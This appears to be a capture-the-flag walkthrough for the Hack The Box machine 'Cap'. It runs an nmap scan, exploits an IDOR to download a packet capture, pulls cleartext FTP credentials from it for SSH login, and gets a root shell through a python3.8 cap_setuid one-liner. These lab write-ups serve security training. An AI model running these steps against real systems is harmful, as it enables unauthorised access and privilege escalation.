## The commands, in order

**Scan.** Find what is listening before you poke anything.

```bash
nmap -sT 10.10.10.245 -T4 -vv
# 21/tcp FTP, 22/tcp SSH, 80/tcp HTTP

nmap -sC -sV -p 21,22,80 10.10.10.245 -T4 -Pn
# vsftpd 3.0.3, OpenSSH 8.2p1, Gunicorn
```

![Nmap TCP connect scan against CAP showing ports 21, 22 and 80 open](/images/content/htb/non-Thumbnails/cap-htb-nmap-sT.png)

![Nmap version detection against CAP naming vsftpd, OpenSSH and Gunicorn](/images/content/htb/non-Thumbnails/cap-htb-nmap-version.png)

**The IDOR.** Hit the security snapshot in the web dashboard, then watch where the browser lands: `/data/<id>`. That id is yours to change.

![Walking the /data/ paths by id to find the one that returns a capture](/images/content/htb/non-Thumbnails/cap-htb-endpoint-bruteforce.png)

```bash
# walk the low ids, one is not like the others
curl -s -b "session=<your-cookie>" http://10.10.10.245/data/0 -o cap.pcap
# /data/0 is the capture, not an empty page
```

![The /data/0 endpoint returning the leaked PCAP file](/images/content/htb/non-Thumbnails/cap-htb-data-0.png)

**PCAP to credentials.** Open the capture in Wireshark and follow the FTP stream. FTP sends the login in cleartext, so the password is sitting in the packet.

![The FTP username and password captured in cleartext inside the PCAP](/images/content/htb/non-Thumbnails/cap-htb-ftp-creds.png)

```bash
# the same pair works over SSH - it is reused
ssh nathan@10.10.10.245
```

**Privilege escalation.** Cap has a capability set on a binary, not a kernel bug.

![linPEAS output flagging the capability set on python3.8](/images/content/htb/non-Thumbnails/cap-htb-linpeas-pe1.png)

![More linPEAS output pointing at python3.8 as the way to escalate](/images/content/htb/non-Thumbnails/cap-htb-linpeas-pe2.png)

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.8 cap_setuid+ep

python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id; cat /root/root.txt
```

![A root shell on CAP after exploiting the python3.8 capability](/images/content/htb/non-Thumbnails/cap-htb-iamroot.png)
